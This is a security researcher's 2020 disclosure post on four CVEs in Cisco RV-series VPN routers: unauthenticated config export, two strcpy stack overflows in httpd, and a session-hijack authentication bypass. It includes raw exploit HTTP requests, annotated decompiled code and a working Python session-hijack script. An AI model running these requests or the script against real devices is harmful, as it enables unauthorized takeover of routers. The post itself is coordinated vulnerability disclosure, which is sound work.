---
layout: post
title:  "Breaking Cisco RV110W, RV130, RV130W, and RV215W. Again."
date:   2020-07-14 18:00:00
comments: true
author: qkaiser
categories: exploitdev
excerpt: |
    Cisco RV110W, RV130(W), and RV215W VPN routers are affected by authentication bypass, authenticated remote        command execution, and information disclosure issues. By chaining them an unauthenticated remote attacker can fully compromise your device. Patch now.

---

More than a year ago now, Pentest Partners published an [article](https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/) explaining CVE-2019-1663, a stack buffer overflow affecting multiple low end devices from Cisco (RV110, RV130, RV215). I then went on writing exploit modules for each affected device and version, as detailed in my "[Exploiting CVE-2019-1663](https://qkaiser.github.io/exploitdev/2019/08/30/exploit-CVE-2019-1663/)" post.

During the analysis I found other issues that I reported to Cisco PSIRT. These issues are now fixed.

**TL;DR;** Cisco RV110W, RV130(W), and RV215W VPN routers are affected by authentication bypass, authenticated remote command execution, and information disclosure issues. By chaining them an unauthenticated remote attacker can fully compromise your device. Patch now.

### Coordinated Disclosure Timeline

- **4 Nov 2019** - Initial report to Cisco PSIRT
- **5 Nov 2019** - Cisco assigned case handler and start looking at the report
- **17 Jan 2020** - PSIRT provides tentative fix release date (March 2020)
- At this point COVID-19 happens and makes everything slower but Cisco folks kept me informed along the way
- **5 Jun 2020** - CVE identifiers are assigned, tenative fix release date is set to July 2020
- **15 Jul 2020** - Release of fixed firmwares and security advisories

### Cisco Security Advisories

You can find Cisco advisories at the following locations:

- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX)  (CVE-2020-3145/CVE-2020-3146)
- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ)  (CVE-2020-3144)
- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-info-dis-FEWBWgsD](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-info-dis-FEWBWgsD)  (CVE-2020-3150)


Detailed advisories with proof-of-concepts follows. As always, if you have any question just get in touch on [Twitter](https://twitter.com/qkaiser) or by [email](mailto:kaiserquentin@gmail.com).

---

### CVE-2020-3150 - Cisco RV110W/RV130/RV130/RV215W Routers Unauthenticated Configuration Export

#### Summary

A vulnerability in the web-based management interface of Cisco RV110W/RV130W/RV215W Wireless-N
Multifunction VPN Routers could allow an unauthenticated, remote attacker to retrieve sensitive information.

#### Impact

A successful exploit could allow the attacker to download the router configuration or detailed diagnostic
information.

Note that to be able to download the file, an administrator user must have open the page backup.asp on the
device since the latest reboot. Once the page is accessed, a flag is set by the httpd binary, allowing for
generation of the startup.cfg file download (saved in /tmp/config.txt).

#### Affected Systems

- RV110W Wireless-N Multifunction VPN Router up to version 1.2.2.4 included
- RV130 Multifunction VPN Router up to version 1.0.3.51 included
- RV130W Wireless-N Multifunction VPN Router up to version 1.0.3.51 included
- RV215W Wireless-N Multifunction VPN Router up to version 1.3.1.4 included

#### Description

The vulnerability is due to improper access controls for URLs. An attacker could exploit this vulnerability by
connecting to an affected device via HTTP or HTTPS and requesting specific URLs.

Here we show that an early version of the RV215W is affected:

```
GET /startup.cfg HTTP/1.1
Host: 192.168.1.1
Connection: close

HTTP/1.1 200 Ok
Server: httpd
Date: Fri, 01 Jan 2010 00:01:46 GMT
Content-Disposition: attachment; filename=RV215W_startup.cfg
Content-Type: application/octet-stream
Connection: close
;RV215W Configuration File - Version: 1.1.0.5
;MAC address: 10:BD:18:AC:57:3A
;Serial Number: CCQ231407B9
;The checksum: 8A41D8E444067386
--snip--
```

Other files are also affected, but it depends on the setup, such as mirror.cfg or backup.cfg

### CVE-2020-3145 - Cisco RV130/RV130W Routers Management Interface Remote Command Execution (IPSEC)

#### Summary

A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN
Router could allow an authenticated, remote attacker to execute arbitrary code on an affected device.

#### Impact

A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of
the affected device as a high-privilege user.

#### Affected Systems

- RV130 Multifunction VPN Router up to version 1.0.3.51 included
- RV130W Wireless-N Multifunction VPN Router up to version 1.0.3.51 included

#### Description

The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.

We identified multiple dangerous calls to strcpy in the function at 0x00071cac in the httpd binary
(/usr/sbin/httpd in firmware rootfs).

The decompiled function looks like the pseudo-code below, comments are personal additions:

{% highlight c %}
void apply_ipsec_policy(void)
{
    char *ipsec_policy_name;
    char *ipsec_endpoint_type;
    char *ipsec_netbios;
    char *ipsec_local_start;
    char *ipsec_remote_type;
    char *ipsec_remote_subnet;
    char *ipsec_spi_outgo;
    char *ipsec_enc_keyin;
    char *manual_ipsec_int;
    char *ipsec_key_keyout;
    char *auto_ipsec_enc;
    char *ipsec_pfs_enable;
    char *ipsec_ike_policy_name;
    int edit_eq;
    int ipsec_policy_index;
    int iVar1;
    int netbios_off;
    int pfs_enable;
    int edit_policy;
    char *ipsec_local_type;
    char *ipsec_local_subnet;
    char *ipsec_remote_start;
    char *ipsec_spi_income;
    char *manual_ipsec_enc;
    char *ipsec_enc_keyout;
    char *ipsec_int_keyin;
    char *ipsec_sa_lifetime;
    char *auto_ipsec_int;
    char *ipsec_policy_type;
    char *exc_stflg;
    undefined2 *ike_selidx;
    char *ipsec_endpoint_value;
    char *ipsec_pfs_group;
    char acStack1224 [74];
    char acStack1150 [18];
    char acStack1132 [8];
    char acStack1124 [256];
    char acStack868 [16];
    char acStack852 [8];
    char acStack844 [2];
    char acStack842 [16];
    char acStack826 [16];
    char acStack810 [2];
    char acStack808 [16];
    char acStack792 [16];
    undefined2 uStack776;
    char acStack768 [32];
    char acStack736 [16];
    undefined2 local_2d0;
    char acStack712 [32];
    char acStack680 [16];
    char acStack664 [32];
    char acStack632 [32];
    char acStack600 [16];
    char acStack584 [128];
    char acStack456 [128];
    char acStack328 [16];
    char acStack312 [128];
    char acStack184 [148];
    ipsec_policy_name = (char *)get_cgi_param("ipsec_policy_name");
    if (ipsec_policy_name == (char *)0x0) {
        ipsec_policy_name = "";
        ipsec_policy_type = (char *)get_cgi_param("ipsec_policy_type");
    }
    else {
        ipsec_policy_type = (char *)get_cgi_param("ipsec_policy_type");
    }
    if (ipsec_policy_type == (char *)0x0) {
        ipsec_policy_type = "";
        ipsec_endpoint_type = (char *)get_cgi_param("ipsec_endpoint_type");
    }
    else {
        ipsec_endpoint_type = (char *)get_cgi_param("ipsec_endpoint_type");
    }
    if (ipsec_endpoint_type == (char *)0x0) {
        ipsec_endpoint_type = "";
        ipsec_endpoint_value = (char *)get_cgi_param("ipsec_endpoint_value");
    }
    else {
        ipsec_endpoint_value = (char *)get_cgi_param("ipsec_endpoint_value");
    }
    if (ipsec_endpoint_value == (char *)0x0) {
        ipsec_endpoint_value = "";
    }
    ipsec_netbios = (char *)get_cgi_param("ipsec_netbios");
    if (ipsec_netbios == (char *)0x0) {
        ipsec_netbios = "";
        ipsec_local_type = (char *)get_cgi_param("ipsec_local_type");
    }
    else {
        ipsec_local_type = (char *)get_cgi_param("ipsec_local_type");
    }
    if (ipsec_local_type == (char *)0x0) {
        ipsec_local_type = "";
        ipsec_local_start = (char *)get_cgi_param("ipsec_local_start");
    }
    else {
        ipsec_local_start = (char *)get_cgi_param("ipsec_local_start");
    }
    if (ipsec_local_start == (char *)0x0) {
        ipsec_local_start = "";
        ipsec_local_subnet = (char *)get_cgi_param("ipsec_local_subnet");
    }
    else {
        ipsec_local_subnet = (char *)get_cgi_param("ipsec_local_subnet");
    }
    if (ipsec_local_subnet == (char *)0x0) {
        ipsec_local_subnet = "";
        ipsec_remote_type = (char *)get_cgi_param("ipsec_remote_type");
    }
    else {
        ipsec_remote_type = (char *)get_cgi_param("ipsec_remote_type");
    }
    if (ipsec_remote_type == (char *)0x0) {
        ipsec_remote_type = "";
        ipsec_remote_start = (char *)get_cgi_param("ipsec_remote_start");
    }
    else {
        ipsec_remote_start = (char *)get_cgi_param("ipsec_remote_start");
    }
    if (ipsec_remote_start == (char *)0x0) {
        ipsec_remote_start = "";
        ipsec_remote_subnet = (char *)get_cgi_param("ipsec_remote_subnet");
    }
    else {
        ipsec_remote_subnet = (char *)get_cgi_param("ipsec_remote_subnet");
    }
    if (ipsec_remote_subnet == (char *)0x0) {
        ipsec_remote_subnet = "";
        ipsec_spi_income = (char *)get_cgi_param("ipsec_spi_income");
    }
    else {
        ipsec_spi_income = (char *)get_cgi_param("ipsec_spi_income");
    }
    if (ipsec_spi_income == (char *)0x0) {
        ipsec_spi_income = "";
        ipsec_spi_outgo = (char *)get_cgi_param("ipsec_spi_outgo");
    }
    else {
        ipsec_spi_outgo = (char *)get_cgi_param("ipsec_spi_outgo");
    }
    if (ipsec_spi_outgo == (char *)0x0) {
        ipsec_spi_outgo = "";
        manual_ipsec_enc = (char *)get_cgi_param("manual_ipsec_enc");
    }
    else {
        manual_ipsec_enc = (char *)get_cgi_param("manual_ipsec_enc");
    }
    if (manual_ipsec_enc == (char *)0x0) {
        manual_ipsec_enc = "";
        ipsec_enc_keyin = (char *)get_cgi_param("ipsec_enc_keyin");
    }
    else {
        ipsec_enc_keyin = (char *)get_cgi_param("ipsec_enc_keyin");
    }
    if (ipsec_enc_keyin == (char *)0x0) {
        ipsec_enc_keyin = "";
        ipsec_enc_keyout = (char *)get_cgi_param("ipsec_enc_keyout");
    }
    else {
        ipsec_enc_keyout = (char *)get_cgi_param("ipsec_enc_keyout");
    }
    if (ipsec_enc_keyout == (char *)0x0) {
        ipsec_enc_keyout = "";
        manual_ipsec_int = (char *)get_cgi_param("manual_ipsec_int");
    }
    else {
        manual_ipsec_int = (char *)get_cgi_param("manual_ipsec_int");
    }
    if (manual_ipsec_int == (char *)0x0) {
        manual_ipsec_int = "";
        ipsec_int_keyin = (char *)get_cgi_param("ipsec_int_keyin");
    }
    else {
        ipsec_int_keyin = (char *)get_cgi_param("ipsec_int_keyin");
    }
    if (ipsec_int_keyin == (char *)0x0) {
        ipsec_int_keyin = "";
        ipsec_key_keyout = (char *)get_cgi_param("ipsec_int_keyout");
    }
    else {
        ipsec_key_keyout = (char *)get_cgi_param("ipsec_int_keyout");
    }
    if (ipsec_key_keyout == (char *)0x0) {
        ipsec_key_keyout = "";
        ipsec_sa_lifetime = (char *)get_cgi_param("ipsec_sa_lifetime");
    }
    else {
        ipsec_sa_lifetime = (char *)get_cgi_param("ipsec_sa_lifetime");
    }
    if (ipsec_sa_lifetime == (char *)0x0) {
        ipsec_sa_lifetime = "";
        auto_ipsec_enc = (char *)get_cgi_param("auto_ipsec_enc");
    }
    else {
        auto_ipsec_enc = (char *)get_cgi_param("auto_ipsec_enc");
    }
    if (auto_ipsec_enc == (char *)0x0) {
        auto_ipsec_enc = "";
        auto_ipsec_int = (char *)get_cgi_param("auto_ipsec_int");
    }
    else {
        auto_ipsec_int = (char *)get_cgi_param("auto_ipsec_int");
    }
    if (auto_ipsec_int == (char *)0x0) {
        auto_ipsec_int = "";
        ipsec_pfs_enable = (char *)get_cgi_param("ipsec_pfs_enable");
    }
    else {
        ipsec_pfs_enable = (char *)get_cgi_param("ipsec_pfs_enable");
    }
    if (ipsec_pfs_enable == (char *)0x0) {
        ipsec_pfs_enable = "dis";
        ipsec_pfs_group = (char *)get_cgi_param("ipsec_pfs_group");
    }
    else {
        ipsec_pfs_group = (char *)get_cgi_param("ipsec_pfs_group");
    }
    if (ipsec_pfs_group == (char *)0x0) {
        ipsec_pfs_group = "";
    }
    ipsec_ike_policy_name = (char *)get_cgi_param("ipsec_ike_policy_name");
    if (ipsec_ike_policy_name == (char *)0x0) {
        ipsec_ike_policy_name = "";
        exc_stflg = (char *)get_cgi_param(0x8fe2c);
    }
    else {
        exc_stflg = (char *)get_cgi_param(0x8fe2c);
    }
    if (exc_stflg == (char *)0x0) {
        exc_stflg = "add";
    }
    ike_selidx = (undefined2 *)get_cgi_param(0x93e90);
    if (ike_selidx == (undefined2 *)0x0) {
        ike_selidx = &DAT_00089938;
    }
    memset(acStack1224,0,0x4a0);
    edit_eq = strcmp(exc_stflg,"edit");
    if (edit_eq == 0) {
        ipsec_policy_index = atoi((char *)ike_selidx);
        iVar1 = openswan_get_ipsec_policy_by_index(ipsec_policy_index,acStack1224);
        if (iVar1 == 0) {
            return;
        }
    }
    strcpy(acStack1224,ipsec_policy_name);
    //stack buffer overflow here
    strcpy(acStack1150,ipsec_policy_type);
    //stack buffer overflow here
    strcpy(acStack1132,ipsec_endpoint_type);
    //stack buffer overflow here
    iVar1 = strcmp(ipsec_endpoint_type,(char *)&DAT_00089938);
    if (iVar1 == 0) {
        strcpy(acStack868,ipsec_endpoint_value);
        //stack buffer overflow here
    }
    else {
        strcpy(acStack1124,ipsec_endpoint_value);
        //stack buffer overflow here
    }
    netbios_off = strcmp(ipsec_netbios,"on");
    if (netbios_off == 0) {
        uStack776 = 0x31;
    }
    else {
        uStack776 = 0x30;
    }
    strcpy(acStack810,ipsec_local_type);
    //stack buffer overflow here
    strcpy(acStack808,ipsec_local_start);
    //stack buffer overflow here
    strcpy(acStack792,ipsec_local_subnet);
    //stack buffer overflow here
    strcpy(acStack844,ipsec_remote_type);
    //stack buffer overflow here
    strcpy(acStack842,ipsec_remote_start);
    //stack buffer overflow here
    strcpy(acStack826,ipsec_remote_subnet);
    //stack buffer overflow here
    strcpy(acStack852,ipsec_ike_policy_name);
    //stack buffer overflow here
    iVar1 = strcmp(ipsec_policy_type,(char *)&DAT_00089938);
    if (iVar1 == 0) {
        strcpy(acStack680,ipsec_sa_lifetime);
        //stack buffer overflow here
        strcpy(acStack768,auto_ipsec_enc);
        //stack buffer overflow here
        strcpy(acStack736,auto_ipsec_int);
        //stack buffer overflow here
        pfs_enable = strcmp(ipsec_pfs_enable,"dis");
        if (pfs_enable != 0) {
            local_2d0 = 0x31;
            strcpy(acStack712,ipsec_pfs_group);
            //stack buffer overflow here
        }
        edit_policy = strcmp(exc_stflg,"add");
    }
    else {
        strcpy(acStack664,ipsec_spi_income);
        //stack buffer overflow here
        strcpy(acStack632,ipsec_spi_outgo);
        //stack buffer overflow here
        strcpy(acStack600,manual_ipsec_enc);
        //stack buffer overflow here
        strcpy(acStack584,ipsec_enc_keyin);
        //stack buffer overflow here
        strcpy(acStack456,ipsec_enc_keyout);
        //stack buffer overflow here
        strcpy(acStack328,manual_ipsec_int);
        //stack buffer overflow here
        strcpy(acStack312,ipsec_int_keyin);
        //stack buffer overflow here
        strcpy(acStack184,ipsec_key_keyout);
        //stack buffer overflow here
        edit_policy = strcmp(exc_stflg,"add");
    }
    if (edit_policy == 0) {
        openswan_add_ipsec_policy(acStack1224);
    }
    else {
        iVar1 = strcmp(exc_stflg,"edit");
        if (iVar1 == 0) {
            iVar1 = atoi((char *)ike_selidx);
            openswan_edit_ipsec_policy(iVar1,acStack1224);
        }
    }
    return;
}
{% endhighlight %}

It is possible to trigger one of the stack buffer overflow above with an authenticated request such as the one
below:

```
POST /apply.cgi;session_id=b37f0e917e54a1af0e1d7a0027d9de5d HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/apply.cgi;session_id=79f76000d1a3c29cef38c6dd14f25c0e
Content-Type: application/x-www-form-urlencoded
Content-Length: 1812
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

submit_button=vpn_adv_refresh&change_action=&submit_type=&gui_action=Apply&ipsec_enc=aes
128&ipsec_int=sha1&backname=&stflg=add&selidx=0&ipsec_stflg=add&ipsec_selidx=0&ike_stflg
=&ike_selidx=&next_page=vpn_adv&ipsec_policy_name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ipsec_policy_type=0&ipsec_en
dpoint_type=0&ipsec_endpoint_value=1.1.1.1&ipsec_local_type=0&ipsec_local_start=1.1.1.1&
ipsec_local_subnet=255.255.255.255&ipsec_remote_type=0&ipsec_remote_start=1.1.1.1&ipsec_
remote_subnet=255.255.255.255&start_auto=&ipsec_sa_lifetime=3600&auto_ipsec_enc=aes128&a
uto_ipsec_int=sha1&ipsec_ike_policy_name=1&end_auto=&webpage_end=
```

### CVE-2020-3146 - Cisco RV130/RV130W Routers Management Interface Remote Command Execution (PPP)

#### Summary

A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN
Router could allow an authenticated, remote attacker to execute arbitrary code on an affected device.

#### Impact

A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of
the affected device as a high-privilege user.

#### Affected Systems

- RV130 Multifunction VPN Router up to version 1.0.3.51 included
- RV130W Wireless-N Multifunction VPN Router up to version 1.0.3.51 included

#### Description

The vulnerability is due to improper validation of user-supplied data in the web-based management interface.

An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.

We identified a dangerous call to strcpy in the function at 0x0006e994 in the httpd binary (/usr/sbin/httpd in
firmware rootfs).

The decompiled function looks like the pseudo-code below, comments are personal additions:

{% highlight c %}
void FUN_0006e994(void)
{
    char *__s2;
    int iVar1;
    FILE *__stream;
    char acStack856 [500];
    undefined4 local_164;
    undefined4 uStack352;
    undefined4 uStack348;
    undefined4 uStack344;
    undefined local_154;
    char acStack323 [64];
    char acStack259 [67];
    undefined4 local_c0;
    undefined4 local_7c;
    undefined4 local_78;
    undefined4 local_74;
    undefined4 local_70;
    undefined2 local_2a;
    undefined2 local_28;
    undefined2 local_26;
    undefined2 local_24;
    undefined2 local_22;
    __s2 = (char *)FUN_0001d0fc("wizard_pppoe_pname"); // __s2 is the POST parameter
    "wizard_pppoe_pname"
    iVar1 = FUN_0001d0fc("ppp_passwd");
    if (iVar1 != 0 && __s2 != (char *)0x0) {
        local_2a = 0;
        local_28 = local_2a;
        local_26 = local_2a;
        local_24 = local_2a;
        local_22 = local_2a;
        memset(acStack856,0,500);
        b64_decode(iVar1,acStack856,500);
        iVar1 = nvram_get("pppoe_select_profile");
        if (iVar1 == 0) {
            memset(&local_164,0,0x138);
            get_pppoe_profile(0,&local_164);
            iVar1 = strcmp((char *)&local_164,__s2);
            if (iVar1 == 0) {
                snprintf((char *)&local_2a,10,"%d",0);
            }
            else {
                snprintf((char *)&local_2a,10,(char *)&DAT_00089938);
            }
            memset(&local_164,0,0x138);
            get_pppoe_profile(1,&local_164);
            iVar1 = strcmp((char *)&local_164,__s2);
            if (iVar1 == 0) {
                snprintf((char *)&local_2a,10,"%d",1);
            }
            else {
                snprintf((char *)&local_2a,10,(char *)&DAT_00089938);
            }
        }
        else {
            iVar1 = nvram_get("pppoe_select_profile");
            if (iVar1 == 0) {
                iVar1 = 0x8ce7c;
            }
            snprintf((char *)&local_2a,10,"%s",iVar1);
        }
        memset(&local_164,0,0x138);
        __stream = fopen("/dev/console","w");
        if (__stream != (FILE *)0x0) {
            fprintf(__stream,"\n %s(%d),
            now_idx=[%s]\n","validate_wizard_pppoe_profile",0x30,&local_2a);
            fclose(__stream);
        }
        local_164 = 0x617a6977;
        uStack352 = 0x705f6472;
        uStack348 = 0x69666f72;
        uStack344 = 0x315f656c;
        local_154 = 0;
        strcpy(acStack323,__s2);
        // __s2 is copied into an array without bound checks,
        triggering a stack overflow
        strcpy(acStack259,acStack856);
        local_74 = 0x1e;
        local_78 = 5;
        local_c0 = 0;
        local_7c = 0;
        local_70 = 0;
        iVar1 = atoi((char *)&local_2a);
        set_pppoe_profile(iVar1,&local_164);
        nvram_set("pppoe_select_profile",&local_2a);
    }
    return;
}
{% endhighlight %}

It is possible to trigger one of the stack buffer overflow above with an authenticated request such as the one
below:

```
POST /apply.cgi;session_id=b37f0e917e54a1af0e1d7a0027d9de5d HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/apply.cgi;session_id=79f76000d1a3c29cef38c6dd14f25c0e
Content-Type: application/x-www-form-urlencoded
Content-Length: 1812
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

submit_button=wan&change_action=&submit_type=&ppp_passwd=dGVzdA==&wizard_pppoe_pname=AAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gui_action=Apply&pppoe_select
_profile=0&wait_time=20&chg_flg=0wantag_enable=0&lan_ipaddr=192.168.1.1&wan_proto=pppoe&
ppp_demand=&_pppoe_select_profile=0&mtu_enable=0&webpage_end=
```

### CVE-2020-3144 - Cisco RV110W/RV130/RV130/RV215W Routers Authentication Bypass

#### Summary

A vulnerability in the web-based management interface of the Cisco RV110W/RV130W/RV215W Wireless-N
Multifunction VPN Routers could allow an unauthenticated, remote attacker to gain unauthorized access to
the web-based management interface.

#### Impact

An unauthenticated user can gain unauthorized access to the router's web-based management interface.

#### Affected Systems

- RV110W Wireless-N Multifunction VPN Router up to version 1.2.2.4 included
- RV130 Multifunction VPN Router up to version 1.0.3.51 included
- RV130W Wireless-N Multifunction VPN Router up to version 1.0.3.51 included
- RV215W Wireless-N Multifunction VPN Router up to version 1.3.1.4 included

#### Description

When an administrator logs into the device administrative interface and that a session is already opened, the
UI displays a message asking if the user wants to disconnects the already opened session. When the admin
clicks “OK”, the following request is sent:

```
POST /login.cgi HTTP/1.1
Host: 192.168.1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1812
Connection: close
submit_button=login&submit_type=continue&gui_action=gozilla_cgi
```

The server then proceeds and provides a valid session to the end user.

A malicious attacker can take advantage of the fact that the confirmation requests is neither authenticated
nor bound to the legitimate administrator's source IP to hijack its session.

By constantly sending confirmation requests in a loop, if a request happens to be received between an
administrator authentication request and authentication confirmation, the attacker will successfully hijack that
session.

The Python script below is a proof of concept demonstrating the issue. Run it in the background and try to
authenticate twice on the device's web administration interface to see how the session is successfully
hijacked.

{% highlight python %}
#!/usr/bin/env python
import requests
from time import sleep
import re
payload = {
    "submit_button":"login",
    "submit_type":"continue",
    "gui_action":"gozila_cgi",
}
while True:
    try:
        resp = requests.post(
            "https://192.168.1.1/login.cgi",
            data=payload,
            verify=False
        )
        if "Login Page" in resp.content:
            sleep(1)
        else:
            sessionid = re.findall(r"session_id=([^\"]+)", resp.content)[0]
            print("[+] Successfully hijacked admin session. Session id is
            {}".format(sessionid))
            break
    except KeyboardInterrupt as e:
        break
{% endhighlight %}
